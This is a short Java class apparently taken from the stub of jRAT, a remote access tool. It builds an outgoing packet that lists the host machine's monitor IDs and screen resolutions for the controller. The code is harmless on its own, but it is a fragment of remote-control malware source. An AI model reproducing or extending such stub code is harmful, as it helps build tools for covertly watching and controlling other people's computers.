package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.awt.GraphicsDevice;
import java.awt.Rectangle;
import java.io.DataOutputStream;


public class Packet61InitMonitors extends AbstractOutgoingPacket {

	private GraphicsDevice[] graphicsDevices;

	public Packet61InitMonitors(GraphicsDevice[] graphicsDevices) {
		this.graphicsDevices = graphicsDevices;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(graphicsDevices.length);

		for (GraphicsDevice device : graphicsDevices) {
			Rectangle screenBounds = device.getDefaultConfiguration().getBounds();
			String id = device.getIDstring();
			if (id.startsWith("\\")) {
				id = id.substring(1, id.length());
			}
			sw.writeLine(id + ": " + screenBounds.width + "x" + screenBounds.height);
		}
	}

	@Override
	public byte getPacketId() {
		return (byte) 61;
	}

}
